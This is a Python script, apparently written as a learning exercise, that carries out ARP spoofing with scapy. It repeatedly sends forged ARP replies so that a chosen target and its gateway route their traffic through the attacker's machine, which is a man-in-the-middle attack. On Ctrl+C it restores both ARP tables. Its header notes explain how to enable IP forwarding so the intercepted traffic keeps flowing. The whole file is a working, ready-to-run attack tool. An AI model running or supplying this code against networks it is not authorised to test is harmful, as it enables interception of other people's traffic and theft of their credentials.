#!/usr/bin/python3

import scapy.all as scapy
import argparse
import time
#import sys

'''
-- scapy.ls(scapy.ARP) will show the fields we can use
-- use a network scanner to find the target IP and MAC
-- use route -n to find the router's IP
-- packet.show() and packet.summary() in our case will show us the packet information to help 
    us understand what we're working with
-- setting op to 2 makes it a response packet, 1 is an ask packet
-- arp -a will show you your current ARP table
-- dont forget to to the IP forward: (may change based on linux distro)
    echo 1 > /proc/sys/net/ipv4/ip_forward
-- comma after the print statement "cancels" the \n that's automatically at the end of it but stores in buffer
-- sys.stdout.flush() doesnt let it store in buffer and just prints it right away
-- \r tells the print statement to start at the beginning of its line.
            the above 3 are for lower than python3
-- in python3, just add end="" and fill the quotes with what you want to end the line with
'''


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="Specify a target IP to spoof")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Specify the gateway IP to spoof")
    target_ip = parser.parse_args().target_ip
    gateway_ip = parser.parse_args().gateway_ip
    target_list = [target_ip, gateway_ip]
    if target_ip is None or gateway_ip is None:
        print("\n[-] Please see help message using: -h or --help\n" )
        exit(1)
    return target_list


def get_mac(target_ip):
    arp_request = scapy.ARP(pdst=target_ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    target_mac = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0][0][1].hwsrc
    return target_mac


def spoof(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    scapy.send(packet, verbose=False)


def unspoof(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    scapy.send(packet, count=6, verbose=False)


def mitmspoof(victim, gateway):
    sent_packet_count = 0
    print("\nStarting spoof --> Don't forget to turn on port forwarding!\n")
    try:
        while True:
            spoof(victim, gateway)
            spoof(gateway, victim)
            sent_packet_count += 2
            # print("\r[+] Sent %d packets." % sent_packet_count),
            print("\r[+] Sent %d packets between %s and %s " % (sent_packet_count, victim, gateway), end="<--")
            # sys.stdout.flush()
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n\n[-] Detected CTRL+C .... Stopping")
        print("[-] ReARPing gateway! Sending 6 packets to %s, please wait..." % gateway)
        unspoof(gateway, victim)
        print("[-] ReARPing target! Sending 6 packets to %s, please wait..." % victim)
        unspoof(victim, gateway)
        print("Stopped spoofing --> Don't forget to turn off port forwarding!")


mitmspoof(get_args()[0], get_args()[1])
